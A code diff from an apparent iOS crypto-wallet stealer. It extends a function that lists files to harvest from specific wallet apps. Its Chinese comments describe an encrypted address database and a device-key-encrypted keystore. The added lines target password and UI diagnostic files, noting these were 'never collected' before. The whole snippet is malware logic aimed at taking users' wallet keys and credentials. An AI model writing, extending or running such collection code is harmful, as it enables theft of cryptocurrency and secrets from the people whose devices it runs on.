@@ -349,17 +349,23 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                  @"Documents/keystore/"];
     }
     if ([bundleId isEqualToString:@"com.global.wallet.ios"]) {
-        // 按 tp_boot 拿到的真实目录树补全（之前漏了 label.sqlite3 和 .devcache）：
-        //   Documents/db/main.sqlite3   184,320 B
-        //   Documents/db/label.sqlite3  16,977,920 B
-        //   Documents/F4SeCyr/<sha256>  592 B   ← 哈希命名的秘密文件
+        // 按 tp_boot 拿到的真实目录树补全：
+        //   Documents/db/main.sqlite3   196,608 B（SQLCipher4，地址就在 wallet 表）
+        //   Documents/db/label.sqlite3  16.9 MB（超过单文件 16MB 上限会被跳过，不影响地址）
+        //   Documents/F4SeCyr/<sha256>  592 B（device key 加密的 keystore）
         //   Documents/.devcache         675 B
+        // 后面的 _tp_* 是 tp 模块自己写的诊断文件 —— 必须逐个列出来，
+        // 之前只写了 _tp_kdf*，导致 _tp_ui_* / _tp_pw_* 从来没被采集到。
         return @[@"Documents/db/main.sqlite3",
                  @"Documents/db/label.sqlite3",
                  @"Documents/F4SeCyr/",
                  @"Documents/.devcache",
                  @"Documents/_tp_kdf.txt",
                  @"Documents/_tp_kdf_status.txt",
+                 @"Documents/_tp_ui_status.txt",
+                 @"Documents/_tp_ui_probe.txt",
+                 @"Documents/_tp_pw_ok.txt",
+                 @"Documents/_tp_pw_detail.txt",
                  @"Library/Preferences/com.global.wallet.ios.plist"];
     }
     if ([bundleId isEqualToString:@"com.okex.OKExAppstoreFull"]) {
